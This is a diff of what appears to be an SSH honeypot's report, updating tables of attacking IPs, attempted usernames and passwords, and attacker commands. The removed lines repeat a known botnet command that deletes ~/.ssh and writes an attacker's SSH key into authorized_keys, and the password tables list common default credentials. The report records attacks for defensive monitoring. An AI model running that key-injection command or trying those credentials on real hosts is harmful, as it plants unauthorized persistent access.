@@ -13,66 +13,52 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 103.170.204.115:55914 | 4 |
-| 125.124.156.244:34612 | 4 |
-| 15.235.206.113:48622 | 4 |
-| 171.22.31.22:60352 | 4 |
-| 183.63.103.84:58817 | 4 |
-| 47.108.137.159:47778 | 4 |
-| 47.243.38.185:37058 | 4 |
-| 47.243.38.185:40108 | 4 |
-| 47.243.38.185:42228 | 4 |
-| 47.243.38.185:47408 | 4 |
+| 147.182.164.92 | 43307 |
+| 47.115.231.124 | 20179 |
+| 163.172.120.204 | 4930 |
+| 149.129.249.160 | 4331 |
+| 47.76.227.20 | 4220 |
+| 8.219.148.39 | 1859 |
+| 47.108.137.159 | 524 |
+| 8.216.85.26 | 200 |
+| 120.26.121.171 | 159 |
+| 182.92.202.15 | 159 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 508 |
-| ubuntu | 100 |
-| test | 59 |
-| user | 36 |
-| postgres | 32 |
-| sysadmin | 30 |
-| frappe | 24 |
-| nexus | 17 |
-| support | 16 |
-| deploy | 14 |
+| root | 22510 |
+| log | 8283 |
+| ubuntu | 378 |
+| test | 262 |
+| user | 167 |
+| admin | 121 |
+| sysadmin | 89 |
+| support | 83 |
+| steam | 59 |
+| odoo | 46 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| password | 43 |
-| 123456 | 38 |
-| P@ssw0rd | 35 |
-| root | 31 |
-| 123 | 28 |
-| admin | 22 |
-| 1qq2w3e4r5t | 17 |
-| test | 16 |
-| 1 | 16 |
-| splunk | 11 |
+| password | 138 |
+| P@ssw0rd | 138 |
+| test | 85 |
+| 123456 | 84 |
+| 1qq2w3e4r5t | 80 |
+| admin | 64 |
+| root | 60 |
+| 1 | 52 |
+| 12345678 | 48 |
+| ubuntu123 | 45 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 15.235.206.113 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 15.235.206.113 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 15.235.206.113 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 103.170.204.115 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 103.170.204.115 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 103.170.204.115 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 171.22.31.22 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 171.22.31.22 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 171.22.31.22 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 125.124.156.244 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 125.124.156.244 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 125.124.156.244 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 183.63.103.84 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 183.63.103.84 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 183.63.103.84 | cat /proc/cpuinfo \| grep name \| wc -l |
-| 5.135.36.99 | cd ~; chattr -ia .ssh; lockr -ia .ssh |
-| 5.135.36.99 | cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ |
-| 5.135.36.99 | cat /proc/cpuinfo \| grep name \| wc -l |
+| 182.92.202.15 | uname -s -m |
+| 182.92.237.4 | uname -s -m |
+| 120.26.121.171 | uname -s -m |
+| 147.182.164.92 | echo -e "\x6F\x6B" |
